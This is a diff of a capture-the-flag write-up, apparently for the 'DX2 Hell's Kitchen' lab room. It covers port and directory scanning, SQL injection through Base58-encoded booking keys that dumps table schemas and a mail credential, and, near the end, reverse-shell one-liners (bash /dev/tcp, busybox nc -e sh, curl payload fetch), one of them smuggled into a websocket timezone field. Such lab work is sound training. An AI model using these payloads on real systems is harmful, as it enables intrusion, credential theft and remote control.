@@ -9,37 +9,28 @@
 
 
 
+```bash
+xx.xxx.xx.xxx dx2.thm
+```
+
+```bash
 :~# nmap -p- -T4 dx2.thm
-Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-18 19:10 BST
-mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
-mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
-Nmap scan report for dx2.thm (10.201.58.121)
-Host is up (0.00057s latency).
-Not shown: 65533 filtered ports
+...
 PORT     STATE SERVICE
 80/tcp   open  http
 4346/tcp open  elanlm
-MAC Address: 16:FF:DB:84:CC:B5 (Unknown)
+```
 
-Nmap done: 1 IP address (1 host up) scanned in 87.60 seconds
-
-
-
-
+```bash
 :~# nmap -sC -sV -p80,4346 -T4 dx2.thm
-Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-18 19:12 BST
-mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
-mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
-Nmap scan report for dx2.thm (10.201.58.121)
-Host is up (0.00032s latency).
-
+...
 PORT     STATE SERVICE VERSION
 80/tcp   open  http
 | fingerprint-strings: 
 |   GetRequest: 
 |     HTTP/1.0 200 OK
 |     content-length: 859
-|     date: Sat, 18 Oct 2025 18:12:52 GMT
+|     date: Sat, 18 Oct 2025 xx:xx:xx GMT
 |     <!DOCTYPE html>
 |     <html>
 |     <head>
@@ -62,17 +53,17 @@ PORT     STATE SERVICE VERSION
 |   HTTPOptions: 
 |     HTTP/1.0 404 Not Found
 |     content-length: 0
-|     date: Sat, 18 Oct 2025 18:12:52 GMT
+|     date: Sat, 18 Oct 2025 xx:xx:xx GMT
 |   NULL: 
 |     HTTP/1.1 408 Request Timeout
 |     content-length: 0
 |     connection: close
-|     date: Sat, 18 Oct 2025 18:12:51 GMT
+|     date: Sat, 18 Oct 2025 xx:xx:xx GMT
 |   RTSPRequest: 
 |     HTTP/1.1 400 Bad Request
 |     content-length: 0
 |     connection: close
-|_    date: Sat, 18 Oct 2025 18:12:52 GMT
+|_    date: Sat, 18 Oct 2025 xx:xx:xx GMT
 |_http-title: Welcome to the 'Ton!
 4346/tcp open  elanlm?
 | fingerprint-strings: 
@@ -80,11 +71,11 @@ PORT     STATE SERVICE VERSION
 |     HTTP/1.1 408 Request Timeout
 |     content-length: 0
 |     connection: close
-|     date: Sat, 18 Oct 2025 18:12:56 GMT
+|     date: Sat, 18 Oct 2025 xx:xx:xx GMT
 |   GetRequest: 
 |     HTTP/1.0 200 OK
 |     content-length: 10909
-|     date: Sat, 18 Oct 2025 18:12:56 GMT
+|     date: Sat, 18 Oct 2025 xx:xx:xx GMT
 |     <!DOCTYPE html>
 |     <html>
 |     <head>
@@ -113,154 +104,186 @@ PORT     STATE SERVICE VERSION
 |     HTTP/1.1 408 Request Timeout
 |     content-length: 0
 |     connection: close
-|_    date: Sat, 18 Oct 2025 18:12:51 GMT
+|_    date: Sat, 18 Oct 2025 xx:xx:xx GMT
+```
 
-
-
-
-
-
-
-:~/DX2HellsKitchen# gobuster dir -u http://10.201.88.12/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+```bash
+:~/DX2HellsKitchen# dirsearch -u http://dx2.thm
 ...
-/about-us             (Status: 200) [Size: 1315]
+Target: http://dx2.thm/
+
+[xx:xx:xx] Starting: 
+[xx:xx:xx] 200 -    1KB - /about-us
+[xx:xx:xx] 404 -   14B  - /static/dump.sql
+
+Task Completed
+```
 
 
+```bash
+:~/DX2HellsKitchen# dirsearch -u http://dx2.thm:4346/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
+...
+Target: http://dx2.thm:4346/
+
+[xx:xx:xx] Starting: 
+[xx:xx:xx] 403 -    0B  - /mail
+[xx:xx:xx] 403 -    0B  - /ws
+
+Task Completed
+```
 
 
-
-
-
-:~/DX2HellsKitchen# gobuster dir -u http://10.201.88.12:4346/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
+```bash
+:~/DX2HellsKitchen# gobuster dir -u http://dx2.thm:4346/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
 ...
 /mail                 (Status: 403) [Size: 0]
 /ws                   (Status: 403) [Size: 0]
+```
 
+<img width="1055" height="413" alt="image" src="https://github.com/user-attachments/assets/3293265f-1b35-4707-8562-893b24b2ad21" />
 
-
-
-
-
-<img width="1129" height="583" alt="image" src="https://github.com/user-attachments/assets/9120ae3f-99bc-41d4-876a-3a19fa0de05e" />
-
-
-<img width="1120" height="309" alt="image" src="https://github.com/user-attachments/assets/f621037e-ae54-44e0-b0d1-f73824e54c3c" />
-
-
-
-
-view-source:http://10.201.88.12/static/check-rooms.js
-
-<img width="1123" height="229" alt="image" src="https://github.com/user-attachments/assets/1093c1c6-4cbf-46ca-9fe3-650a7921aafa" />
+<img width="1058" height="313" alt="image" src="https://github.com/user-attachments/assets/4a4e2236-2ad5-4100-ae63-62692dd2f258" />
 
 <p>Book your Room</p>
 
-<img width="361" height="69" alt="image" src="https://github.com/user-attachments/assets/0bc9abb8-16fc-4def-9c15-a4b89acc9ebc" />
+<img width="1047" height="420" alt="image" src="https://github.com/user-attachments/assets/e60860fc-314a-462b-b907-b7f3f7c87fac" />
+
+<p>Guest Book</p>
+
+<img width="1055" height="564" alt="image" src="https://github.com/user-attachments/assets/6d490306-96a1-4950-82a6-dc97c32e0408" />
+
+<p>Name 	City of Origin<br>
+Gully Foyle 	New York<br>
+Gabriel Syme 	London, England<br>
+Paul Denton 	New York<br>
+Oberst Enzian 	Sudwest, Africa<br>
+Smilla Jasperson 	Copenhagen, Denmark<br>
+Hippolyta Hall 	Los Angeles</p>
 
 
+<p>About Us</p>
 
+<img width="1060" height="706" alt="image" src="https://github.com/user-attachments/assets/7477c1b0-8415-432a-bde5-dcb529d37253" />
 
+<p>dx2.thm/static/check-rooms.js</p>
 
-http://10.201.88.12/guest-book
+<img width="1123" height="229" alt="image" src="https://github.com/user-attachments/assets/1093c1c6-4cbf-46ca-9fe3-650a7921aafa" />
 
-Name 	City of Origin
-Gully Foyle 	New York
-Gabriel Syme 	London, England
-Paul Denton 	New York
-Oberst Enzian 	Sudwest, Africa
-Smilla Jasperson 	Copenhagen, Denmark
-Hippolyta Hall 	Los Angeles
+<p>dx2.thm/new-booking</p>
 
-<img width="962" height="629" alt="image" src="https://github.com/user-attachments/assets/b961a357-d033-47a6-a1c0-137531f1f8bb" />
+<img width="1054" height="276" alt="image" src="https://github.com/user-attachments/assets/8616e766-dcdd-441b-9872-a4e869653085" />
 
+<img width="1058" height="359" alt="image" src="https://github.com/user-attachments/assets/ede43fb3-685e-4029-843d-90100b02b760" />
 
+<p>dx2.thm/static/new-booking.js</p>
 
-http://10.201.88.12/about-us
+<img width="1053" height="462" alt="image" src="https://github.com/user-attachments/assets/0957775c-c534-45ab-9590-3b90016e8a19" />
 
+<img width="1059" height="186" alt="image" src="https://github.com/user-attachments/assets/46974c89-39da-4261-ad89-87ebe4bfb84b" />
 
+<p>BOOKING_KEY:"55oYpt6n8TAVgZajV5aN2fVbr"</p>
 
+<img width="1058" height="365" alt="image" src="https://github.com/user-attachments/assets/ac7d0900-b240-400a-b400-da5d4fe40095" />
 
-<img width="795" height="768" alt="image" src="https://github.com/user-attachments/assets/78d01393-a0a5-40b7-8e14-072df0c4fd3c" />
+<p>BOOKING_KEY:"55oYpt6n8TAVgZajV5aN2fVbr" Base58 decoded is <strong>>BOOKING_KEY:"booking_id:9622295"</strong></p>
 
+<img width="843" height="213" alt="image" src="https://github.com/user-attachments/assets/c7d427d3-12ed-458b-a905-d72994e18009" />
 
-
-
-
-:~/DX2HellsKitchen# curl 10.201.88.12/api/rooms-available
-6
-
-
-http://10.201.88.12/new-booking  -> discovered new-booking.js
-
-
-<img width="942" height="504" alt="image" src="https://github.com/user-attachments/assets/4f4dcd3a-1372-4b5a-bbc3-3c6da387b8a7" />
-
-
-<img width="940" height="348" alt="image" src="https://github.com/user-attachments/assets/4710e84a-55b0-4515-aee8-bef422f293f3" />
-
-55oYpt6n8TAVgZajBTF728oFk
-
-<img width="959" height="449" alt="image" src="https://github.com/user-attachments/assets/4ec539b6-16c5-41b6-8f57-7b5e57f83048" />
-
-
-<p>55oYpt6n8TAVgZajBTF728oFk Base58 decoded is <strong>booking_id:1138907</strong></p>
-
-<img width="766" height="139" alt="image" src="https://github.com/user-attachments/assets/ac2c5804-91ca-406b-8658-6d9e663804e7" />
 
 <br>
 <br>
 <br>
 
-booking_id:1' OR 1=1 -- -
-gcHKyWA7PgMwFfnwduCP2qmyxzLFySmnBe
-
-<img width="767" height="141" alt="image" src="https://github.com/user-attachments/assets/afe6a1f0-2d58-4799-9f9d-0a9d2546f8c6" />
-
-
-
-
-:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=5UBbpHLSVdeXKovifsoS1Lk2ufp6BDXjjrjUc9Qp
+```bash
+/api/booking-info?booking_key=55oYpt6n8TAVgZajQf7kYApbm
 not found 
+```
+
+<p>booking_id:1' OR 1=1 -- -<br>
+gcHKyWA7PgMwFfnwduCP2qmyxzLFySmnBe</p>
 
 
-:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=5UBbpHLSVdeXKovifsoS1Lk2ufp6BDXjkMcegdwS
+```bash
+/api/booking-info?booking_key=gcHKyWA7PgMwFfnwduCP2qmyxzLFySmnBe
+not found 
+```
+
+<p>booking_id:1' ORDER BY 1 -- -<br>
+5UBbpHLSVdeXKovifsoR7DGtABpdk3C5xzW69nG4</p>
+
+```bash
+/api/booking-info?booking_key=5UBbpHLSVdeXKovifsoR7DGtABpdk3C5xzW69nG4
+not found 
+```
+
+<p>booking_id:1' ORDER BY 2 -- -<br>
+5UBbpHLSVdeXKovifsoR7DGtABpdk3C5yVPGEGng</p>
+
+```bash
+/api/booking-info?booking_key=5UBbpHLSVdeXKovifsoR7DGtABpdk3C5yVPGEGng
 not found
+```
 
+<p>booking_id:1' ORDER BY 3 -- -<br>
+5UBbpHLSVdeXKovifsoR7DGtABpdk3C5yzGSJmKJ</p>
 
-:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=5UBbpHLSVdeXKovifsoS1Lk2ufp6BDXjkrVpm8U4
+```bash
+/api/booking-info?booking_key=5UBbpHLSVdeXKovifsoR7DGtABpdk3C5yzGSJmKJ
 bad request
+```
 
+<p>booking_id:1' ORDER BY 4 -- -<br>
+5UBbpHLSVdeXKovifsoR7DGtABpdk3C5zV9cPFqv</p>
 
-:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=5UBbpHLSVdeXKovifsoS1Lk2ufp6BDXjmMNzqczg
+```bash
+/api/booking-info?booking_key=5UBbpHLSVdeXKovifsoR7DGtABpdk3C5zV9cPFqv
 bad request
+```
 
-
-:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=ApfkkDrFctMBrXvW3fJPqtgiyDhrqKLGAWqaQpgwBY91n3Pa
+```bash
+/api/booking-info?booking_key=ApfkkDrFctMBrXvW3fJPqtgiyDhrqKLGAWqaQpgwBY91n3Pa
 {"room_num":"1","days":"2"}
+```
+
+<img width="1056" height="89" alt="image" src="https://github.com/user-attachments/assets/d3189d74-b331-469d-b521-fc536d23199a" />
 
 
-:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=2DM1mNyoCy8z33ctQNHz7tsjQhQwGGJ7BfAkBoWA2fLSzeW1rezWoJm7LdfsGxVyg8EnY
+```bash
+/api/booking-info?booking_key=2DM1mNyoCy8z33ctQNHz7tsjQhQwGGJ7BfAkBoWA2fLSzeW1rezWoJm7LdfsGxVyg8EnY
 {"room_num":"1","days":"3.42.0"}
+```
 
+<img width="1053" height="93" alt="image" src="https://github.com/user-attachments/assets/81ca5a52-2985-4a48-aa1e-7013e4f41b1d" />
 
-:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=3fcdDXstvQBMjWHxTTY4rSpJ6j94tbFcTa7mQHUhBQKPjaSNqvhXzbC5knNsCQxwVfve8CVBUgAQk
+```bash
+/api/booking-info?booking_key=3fcdDXstvQBMjWHxTTY4rSpJ6j94tbFcTa7mQHUhBQKPjaSNqvhXzbC5knNsCQxwVfve8CVBUgAQk
 {"room_num":"1","days":"CREATE TABLE bookings_temp (booking_id TEXT, room_num TEXT, days TEXT)"}root@ip-10-201-63-182:~/DX2HellsKitchen# 
+```
+
+<img width="1051" height="69" alt="image" src="https://github.com/user-attachments/assets/8ddc1c11-75d6-4d70-acda-ab7d69e940de" />
 
 
-
-:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=3HN9EcFJMeWBq54x2Tk9DEGmpUKqvuGUDMnicRgmKLtQCKGoDqqz3iCpif7zzSjFD3qmzCJjZCP1uBpnTEsvgSs4oSALTFZ5FiRyV5aJfBz2MSBKDr5tk2nxZ3tYduYKgRvgakxTrRzntzzmdV4bmM1RVnzUCZAeVTocrhWZBuH428
+```bash
+/api/booking-info?booking_key=3HN9EcFJMeWBq54x2Tk9DEGmpUKqvuGUDMnicRgmKLtQCKGoDqqz3iCpif7zzSjFD3qmzCJjZCP1uBpnTEsvgSs4oSALTFZ5FiRyV5aJfBz2MSBKDr5tk2nxZ3tYduYKgRvgakxTrRzntzzmdV4bmM1RVnzUCZAeVTocrhWZBuH428
 {"room_num":"1","days":"email_access,reservations,bookings_temp"}
+```
+
+<img width="1060" height="73" alt="image" src="https://github.com/user-attachments/assets/11686a04-6ff9-43f9-bbec-1c825b69b204" />
 
 
-:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=ACnMHD6J1XxN7kQu7LfMQWxJfpuVYz2wM2CXcUt398ns3iDxcvLbJ7mcbRKsN1Uk3p8MDfdmnsunVpCev7yTL4AaS7zvCz6ZtckRNq6yVA49Uy2QT4Rx7LKXTdpJiM8QsdNHpFuyma6Ugtkygvyka7ZQT2C3P7tQ
+```bash
+/api/booking-info?booking_key=ACnMHD6J1XxN7kQu7LfMQWxJfpuVYz2wM2CXcUt398ns3iDxcvLbJ7mcbRKsN1Uk3p8MDfdmnsunVpCev7yTL4AaS7zvCz6ZtckRNq6yVA49Uy2QT4Rx7LKXTdpJiM8QsdNHpFuyma6Ugtkygvyka7ZQT2C3P7tQ
 {"room_num":"1","days":"CREATE TABLE email_access (guest_name TEXT, email_username TEXT, email_password TEXT)"}
+```
+
+<img width="1055" height="71" alt="image" src="https://github.com/user-attachments/assets/daa6b723-497c-4037-a9d2-0472c8f379ca" />
 
 
 <p>
 
 - pdenton : 4321chameleon</p>
 
-:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=e7Zicyo9Kq2pk6Ta8E7kEFnsVi7p2VAXKYEfVHZGpseKw9x3o8pAxGhdUhy6EYJanhRv9aMwyu8CKq9maeLfk8QHjEALv2j2B8WLyWypECM8R7bWhWBqf4GpXnyAcicrNuza7Qeb7m4riuWuWc
+:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/BOOKING_KEY?booking_key=e7Zicyo9Kq2pk6Ta8E7kEFnsVi7p2VAXKYEfVHZGpseKw9x3o8pAxGhdUhy6EYJanhRv9aMwyu8CKq9maeLfk8QHjEALv2j2B8WLyWypECM8R7bWhWBqf4GpXnyAcicrNuza7Qeb7m4riuWuWc
 {"room_num":"NEVER LOGGED IN,NEVER LOGGED IN,NEVER LOGGED IN,pdenton,NEVER LOGGED IN,NEVER LOGGED IN","days":",,,4321chameleon,,"}
 
 
@@ -356,6 +379,26 @@ bad request
 
 
 _____
+
+
+
+bash -i >& /dev/tcp/10.201.58.165/4444 0>&1
+
+
+bash -i >& /dev/tcp/10.10.124.116/12280 0>&1
+
+
+tz_id = Intl.DateTimeFormat().resolvedOptions().timeZone + ';bash -i >& /dev/tcp/10.201.58.165/4444 0>&1';
+
+socket.send(tz_id);
+
+
+cat s
+busybox nc 10.201.95.226 443 -e sh
+
+
+UTC;curl 10.201.95.226:443/s;
+
 
 
 
